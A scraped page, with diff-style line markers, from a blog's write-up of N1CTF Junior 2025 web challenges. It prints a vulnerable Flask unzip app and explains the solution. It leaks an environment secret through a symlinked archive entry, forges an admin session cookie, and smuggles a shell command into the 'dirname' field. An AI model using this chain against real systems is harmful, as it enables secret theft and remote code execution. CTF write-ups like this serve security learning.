type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://z9nn8w.github.io/posts/"},{"@type":"ListItem","position":2,"name":"CTF","item":"https://z9nn8w.github.io/posts/ctf/"},{"@type":"ListItem","position":3,"name":"N1CTF Junior 2025 2/2 WEB Writeup","item":"https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"N1CTF Junior 2025 2/2 WEB Writeup","name":"N1CTF Junior 2025 2\/2 WEB Writeup","description":"","keywords":[],"articleBody":"online_unzipper app.py：\nimport os import uuid from flask import Flask, request, redirect, url_for,send_file,render_template, session, send_from_directory, abort, Response app = Flask(__name__) app.secret_key = os.environ.get(\"FLASK_SECRET_KEY\", \"test_key\") UPLOAD_FOLDER = os.path.join(os.getcwd(), \"uploads\") os.makedirs(UPLOAD_FOLDER, exist_ok=True) users = {} @app.route(\"/\") def index(): if \"username\" not in session: return redirect(url_for(\"login\")) return redirect(url_for(\"upload\")) @app.route(\"/register\", methods=[\"GET\", \"POST\"]) def register(): if request.method == \"POST\": username = request.form[\"username\"] password = request.form[\"password\"] if username in users: return \"用户名已存在\" users[username] = {\"password\": password, \"role\": \"user\"} return redirect(url_for(\"login\")) return render_template(\"register.html\") @app.route(\"/login\", methods=[\"GET\", \"POST\"]) def login(): if request.method == \"POST\": username = request.form[\"username\"] password = request.form[\"password\"] if username in users and users[username][\"password\"] == password: session[\"username\"] = username session[\"role\"] = users[username][\"role\"] return redirect(url_for(\"upload\")) else: return \"用户名或密码错误\" return render_template(\"login.html\") @app.route(\"/logout\") def logout(): session.clear() return redirect(url_for(\"login\")) @app.route(\"/upload\", methods=[\"GET\", \"POST\"]) def upload(): if \"username\" not in session: return redirect(url_for(\"login\")) if request.method == \"POST\": file = request.files[\"file\"] if not file: return \"未选择文件\" role = session[\"role\"] if role == \"admin\": dirname = request.form.get(\"dirname\") or str(uuid.uuid4()) else: dirname = str(uuid.uuid4()) target_dir = os.path.join(UPLOAD_FOLDER, dirname) os.makedirs(target_dir, exist_ok=True) zip_path = os.path.join(target_dir, \"upload.zip\") file.save(zip_path) try: os.system(f\"unzip -o {zip_path} -d {target_dir}\") except: return \"解压失败，请检查文件格式\" os.remove(zip_path) return f\"解压完成！\n下载地址: ","wordCount":"2061","inLanguage":"en","datePublished":"2025-09-14T00:00:00Z","dateModified":"2025-09-16T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://z9nn8w.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://z9nn8w.github.io/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://z9nn8w.github.io/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://z9nn8w.github.io/posts title=文章><span>文章</span></a></li><li><a href=https://z9nn8w.github.io/archives title=归档><span>归档</span></a></li><li><a href=https://z9nn8w.github.io/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">N1CTF Junior 2025 2/2 WEB Writeup</h1><div class=post-meta><span title='2025-09-14 00:00:00 +0000 UTC'>September 14, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#online_unzipper aria-label=online_unzipper>online_unzipper</a></li><li><a href=#unfinished aria-label=Unfinished>Unfinished</a></li><li><a href=#ping aria-label=ping>ping</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=online_unzipper>online_unzipper<a hidden class=anchor aria-hidden=true href=#online_unzipper>#</a></h2><p>app.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, redirect, url_for,send_file,render_template, session, send_from_directory, abort, Response
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;FLASK_SECRET_KEY&#34;</span>, <span style=color:#e6db74>&#34;test_key&#34;</span>)
+</span></span><span style=display:flex><span>UPLOAD_FOLDER <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(os<span style=color:#f92672>.</span>getcwd(), <span style=color:#e6db74>&#34;uploads&#34;</span>)
+</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>makedirs(UPLOAD_FOLDER, exist_ok<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> {}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> session:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;login&#34;</span>))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;upload&#34;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/register&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#e6db74>&#34;POST&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
+</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#34;username&#34;</span>]
+</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#34;password&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username <span style=color:#f92672>in</span> users:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;用户名已存在&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        users[username] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;password&#34;</span>: password, <span style=color:#e6db74>&#34;role&#34;</span>: <span style=color:#e6db74>&#34;user&#34;</span>}
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;login&#34;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;register.html&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/login&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#e6db74>&#34;POST&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
+</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#34;username&#34;</span>]
+</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#34;password&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username <span style=color:#f92672>in</span> users <span style=color:#f92672>and</span> users[username][<span style=color:#e6db74>&#34;password&#34;</span>] <span style=color:#f92672>==</span> password:
+</span></span><span style=display:flex><span>            session[<span style=color:#e6db74>&#34;username&#34;</span>] <span style=color:#f92672>=</span> username
+</span></span><span style=display:flex><span>            session[<span style=color:#e6db74>&#34;role&#34;</span>] <span style=color:#f92672>=</span> users[username][<span style=color:#e6db74>&#34;role&#34;</span>]
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;upload&#34;</span>))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;用户名或密码错误&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;login.html&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/logout&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
+</span></span><span style=display:flex><span>    session<span style=color:#f92672>.</span>clear()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;login&#34;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/upload&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#e6db74>&#34;POST&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>upload</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> session:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#34;login&#34;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
+</span></span><span style=display:flex><span>        file <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#34;file&#34;</span>]
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> file:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;未选择文件&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        role <span style=color:#f92672>=</span> session[<span style=color:#e6db74>&#34;role&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> role <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>:
+</span></span><span style=display:flex><span>            dirname <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;dirname&#34;</span>) <span style=color:#f92672>or</span> str(uuid<span style=color:#f92672>.</span>uuid4())
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            dirname <span style=color:#f92672>=</span> str(uuid<span style=color:#f92672>.</span>uuid4())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        target_dir <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(UPLOAD_FOLDER, dirname)
+</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>makedirs(target_dir, exist_ok<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        zip_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(target_dir, <span style=color:#e6db74>&#34;upload.zip&#34;</span>)
+</span></span><span style=display:flex><span>        file<span style=color:#f92672>.</span>save(zip_path)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;unzip -o </span><span style=color:#e6db74>{</span>zip_path<span style=color:#e6db74>}</span><span style=color:#e6db74> -d </span><span style=color:#e6db74>{</span>target_dir<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;解压失败，请检查文件格式&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>remove(zip_path)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;解压完成！&lt;br&gt;下载地址: &lt;a href=&#39;</span><span style=color:#e6db74>{</span>url_for(<span style=color:#e6db74>&#39;download&#39;</span>, folder<span style=color:#f92672>=</span>dirname)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&gt;</span><span style=color:#e6db74>{</span>request<span style=color:#f92672>.</span>host_url<span style=color:#e6db74>}</span><span style=color:#e6db74>download/</span><span style=color:#e6db74>{</span>dirname<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/a&gt;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;upload.html&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/download/&lt;folder&gt;&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>download</span>(folder):
+</span></span><span style=display:flex><span>    target_dir <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(UPLOAD_FOLDER, folder)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(target_dir):
+</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>404</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    files <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>listdir(target_dir)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;download.html&#34;</span>, folder<span style=color:#f92672>=</span>folder, files<span style=color:#f92672>=</span>files)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/download/&lt;folder&gt;/&lt;filename&gt;&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>download_file</span>(folder, filename):
+</span></span><span style=display:flex><span>    file_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(UPLOAD_FOLDER, folder ,filename)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(file_path, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> file:
+</span></span><span style=display:flex><span>            content <span style=color:#f92672>=</span> file<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Response(
+</span></span><span style=display:flex><span>            content,
+</span></span><span style=display:flex><span>            mimetype<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;application/octet-stream&#34;</span>,
+</span></span><span style=display:flex><span>            headers<span style=color:#f92672>=</span>{
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;Content-Disposition&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;attachment; filename=</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        )
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>FileNotFoundError</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;File not found&#34;</span>, <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error: </span><span style=color:#e6db74>{</span>str(e)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>500</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></div><p>注意到role为admin时，dirname可控，可以实现命令拼接rce，伪造flask-session需要先获取<code>app.secret_key</code>，本题是从环境变量导入的，可以利用软链接获取<code>/proc/self/environ</code>的内容：</p><pre tabindex=0><code>FLASK_SECRET_KEY=#mu0cw9F#7bBCoF!
+</code></pre><p>伪造session：</p><pre tabindex=0><code>python flask_session_cookie_manager3.py encode -s &#34;#mu0cw9F#7bBCoF!&#34; -t &#34;{&#39;role&#39;:&#39;admin&#39;,&#39;username&#39;:&#39;test&#39;}&#34;
 
 session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6InRlc3QifQ.aMUi5w.3kOIwdwel1L_sAQZ2loEgjfRIUA
-</code></pre><p>dirname可控实现rce：</p>
-<pre tabindex="0"><code>dirname=1;cat /flag*.txt &gt; /app/uploads/c048ac00-3ec7-4557-b328-00e50c5ec392/flag.txt
-</code></pre><hr>
-<h2 id="unfinished">Unfinished<a hidden class="anchor" aria-hidden="true" href="#unfinished">#</a></h2>
-<p>app.py：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_login <span style="color:#f92672">import</span> LoginManager, UserMixin, login_user, logout_user, current_user, login_required
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> markupsafe <span style="color:#f92672">import</span> escape
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> playwright.sync_api <span style="color:#f92672">import</span> sync_playwright
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;your-secret-key-here&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>login_manager <span style="color:#f92672">=</span> LoginManager()
-</span></span><span style="display:flex;"><span>login_manager<span style="color:#f92672">.</span>init_app(app)
-</span></span><span style="display:flex;"><span>login_manager<span style="color:#f92672">.</span>login_view <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;login&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>(UserMixin):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, id, username, password, bio<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>):
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>id <span style="color:#f92672">=</span> id
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> username
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>password <span style="color:#f92672">=</span> password
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bio <span style="color:#f92672">=</span> bio
-</span></span><span style="display:flex;"><span>admin_password <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">12</span>)<span style="color:#f92672">.</span>hex()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>USERS_DB <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;admin&#39;</span>: User(id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>, password<span style="color:#f92672">=</span>admin_password)}
-</span></span><span style="display:flex;"><span>USER_ID_COUNTER <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_manager.user_loader</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_user</span>(user_id):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> USERS_DB<span style="color:#f92672">.</span>values():
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> str(user<span style="color:#f92672">.</span>id) <span style="color:#f92672">==</span> user_id:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> user
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> USER_ID_COUNTER
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
-</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> USERS_DB:
-</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;Username already exists.&#39;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;register&#39;</span>))
-</span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        USER_ID_COUNTER <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>        new_user <span style="color:#f92672">=</span> User(
-</span></span><span style="display:flex;"><span>            id<span style="color:#f92672">=</span>USER_ID_COUNTER,
-</span></span><span style="display:flex;"><span>            username<span style="color:#f92672">=</span>username,
-</span></span><span style="display:flex;"><span>            password<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>        USERS_DB[username] <span style="color:#f92672">=</span> new_user
-</span></span><span style="display:flex;"><span>        login_user(new_user)
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> make_response(redirect(url_for(<span style="color:#e6db74">&#39;index&#39;</span>)))
-</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#39;ticket&#39;</span>, <span style="color:#e6db74">&#39;your_ticket_value&#39;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;register.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
-</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]
